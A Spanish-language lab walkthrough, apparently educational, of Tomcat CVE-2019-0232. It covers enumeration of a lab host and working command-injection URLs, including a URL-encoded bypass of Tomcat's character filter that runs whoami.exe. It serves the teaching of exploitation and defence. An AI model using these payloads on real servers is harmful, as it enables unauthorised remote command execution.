`CVE-2019-0232` es un problema de seguridad crítico que podría resultar en la ejecución remota de código. Esta vulnerabilidad afecta a los sistemas Windows que tienen la función `enableCmdLineArguments` habilitada. Un atacante puede explotar esta vulnerabilidad aprovechando un fallo de inyección de comandos resultante de un error de validación de entrada del CGI Servlet de Tomcat, permitiéndoles ejecutar comandos arbitrarios en el sistema afectado. Las versiones `9.0.0.M1` a `9.0.17`, `8.5.0` a `8.5.39`, y `7.0.0` a `7.0.93` de Tomcat están afectadas.

El CGI Servlet es un componente vital de Apache Tomcat que permite a los servidores web comunicarse con aplicaciones externas más allá de la JVM de Tomcat. Estas aplicaciones externas suelen ser scripts CGI escritos en lenguajes como Perl, Python o Bash. El CGI Servlet recibe solicitudes de los navegadores web y las reenvía a los scripts CGI para su procesamiento.

En esencia, un CGI Servlet es un programa que se ejecuta en un servidor web, como Apache2, para admitir la ejecución de aplicaciones externas que cumplen con la especificación CGI. Es un middleware entre servidores web y recursos de información externos como bases de datos.

Los scripts CGI se utilizan en sitios web por varias razones, pero también tienen algunas desventajas importantes:

| **Ventajas**                                                                                 | **Desventajas**                                                          |
| -------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| Es simple y efectivo para generar contenido web dinámico.                                    | Genera sobrecarga al tener que cargar programas en memoria para cada solicitud. |
| Se puede usar cualquier lenguaje de programación que pueda leer desde la entrada estándar y escribir en la salida estándar. | No puede almacenar datos en memoria entre solicitudes de página.         |
| Se puede reutilizar el código existente y evitar escribir nuevo código.                     | Reduce el rendimiento del servidor y consume mucho tiempo de procesamiento. |

La configuración `enableCmdLineArguments` para el CGI Servlet de Apache Tomcat controla si se crean argumentos de línea de comandos a partir de la cadena de consulta. Si se establece en true, el CGI Servlet analiza la cadena de consulta y la pasa al script CGI como argumentos. Esta característica puede hacer que los scripts CGI sean más flexibles y fáciles de escribir al permitir que los parámetros se pasen al script sin usar variables de entorno o entrada estándar. Por ejemplo, un script CGI puede usar argumentos de línea de comandos para cambiar entre acciones según la entrada del usuario.

Supongamos que tienes un script CGI que permite a los usuarios buscar libros en el catálogo de una librería. El script tiene dos acciones posibles: "buscar por título" y "buscar por autor."

El script CGI puede usar argumentos de línea de comandos para cambiar entre estas acciones. Por ejemplo, el script se puede llamar con la siguiente URL:

```r
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

Aquí, el parámetro `action` se establece en `title`, lo que indica que el script debe buscar por título del libro. El parámetro `query` especifica el término de búsqueda "the great gatsby."

Si el usuario quiere buscar por autor, puede usar una URL similar:

```r
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

Aquí, el parámetro `action` se establece en `author`, lo que indica que el script debe buscar por nombre del autor. El parámetro `query` especifica el término de búsqueda "fitzgerald."

Al usar argumentos de línea de comandos, el script CGI puede cambiar fácilmente entre diferentes acciones de búsqueda según la entrada del usuario. Esto hace que el script sea más flexible y fácil de usar.

Sin embargo, surge un problema cuando `enableCmdLineArguments` está habilitado en sistemas Windows porque el CGI Servlet no valida correctamente la entrada del navegador web antes de pasarla al script CGI. Esto puede llevar a un ataque de inyección de comandos del sistema operativo, lo que permite a un atacante ejecutar comandos arbitrarios en el sistema objetivo al inyectarlos en otro comando.

Por ejemplo, un atacante puede agregar `dir` a un comando válido usando `&` como separador para ejecutar `dir` en un sistema Windows. Si el atacante controla la entrada a un script CGI que usa este comando, puede inyectar sus propios comandos después de `&` para ejecutar cualquier comando en el servidor. Un ejemplo de esto es `http://example.com/cgi-bin/hello.bat?&dir`, que pasa `&dir` como argumento a `hello.bat` y ejecuta `dir` en el servidor. Como resultado, un atacante puede explotar el error de validación de entrada del CGI Servlet para ejecutar cualquier comando en el servidor.

---

## Enumeration

Escanea el objetivo usando `nmap`, esto ayudará a identificar los servicios activos que operan actualmente en el sistema. Este proceso proporcionará información valiosa sobre el objetivo, descubriendo qué servicios y potencialmente qué versiones específicas están en ejecución, lo que permitirá una mejor comprensión de su infraestructura y posibles vulnerabilidades.

### Nmap - Open Ports

```r
nmap -p- -sC -Pn 10.129.204.227 --open 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
Nmap scan report for 10.129.204.227
Host is up (0.17s latency).
Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm

Host script results:
| smb2-time: 
|   date: 2023-03-23T11:58:42
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
```

Aquí podemos ver que Nmap ha identificado `Apache Tomcat/9.0.17` ejecutándose en el puerto `8080`.

### Finding a CGI script

Una forma de descubrir el contenido del servidor web es utilizando la herramienta de enumeración web `ffuf` junto con el wordlist `dirb common.txt`. Sabiendo que el directorio predeterminado para los scripts CGI es `/cgi`, ya sea por conocimiento previo o investigando la vulnerabilidad, podemos usar la URL `http://10.129.204.227:8080/cgi/FUZZ.cmd` o `http://10.129.204.227:8080/cgi/FUZZ.bat` para realizar fuzzing.

### Fuzzing Extentions - .CMD

```r
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.cmd
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

Dado que el sistema operativo es Windows, intentamos fuzzing para scripts batch. Aunque el fuzzing para scripts con una extensión .cmd no tiene éxito, descubrimos el archivo welcome.bat al hacer fuzzing para archivos con una extensión .bat.

### Fuzzing Extentions - .BAT

```r
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat


       

 /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome

:: Progress: [4614/4614] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

Navegar a la URL descubierta en `http://10.129.204.227:8080/cgi/welcome.bat` devuelve un mensaje:

```r
Welcome to CGI, this section is not functional yet. Please return to home page.
```

---

## Exploitation

Como se discutió anteriormente, podemos explotar `CVE-2019-0232` agregando nuestros propios comandos mediante el uso del separador de comandos batch `&`. Ahora tenemos una ruta de script CGI válida descubierta durante la enumeración en `http://10.129.204.227:8080/cgi/welcome.bat`

```r
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

Navegar a la URL anterior devuelve la salida del comando batch `dir`, sin embargo, intentar ejecutar otras aplicaciones comunes de línea de comandos de Windows, como `whoami`, no devuelve una salida.

Recuperar una lista de variables ambientales llamando al comando `set`:

```r
# http://10.129.204.227:8080/cgi/welcome.bat?&set

Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

De la lista, podemos ver que la variable `PATH` ha sido deshabilitada, por lo que necesitaremos codificar las rutas en las solicitudes:

```r
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

El intento no tuvo éxito y Tomcat respondió con un mensaje de error que indica que se encontró un carácter no válido. Apache Tomcat introdujo un parche que utiliza una expresión regular para evitar el uso de caracteres especiales. Sin embargo, el filtro se puede eludir codificando la carga útil en URL.

```r
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```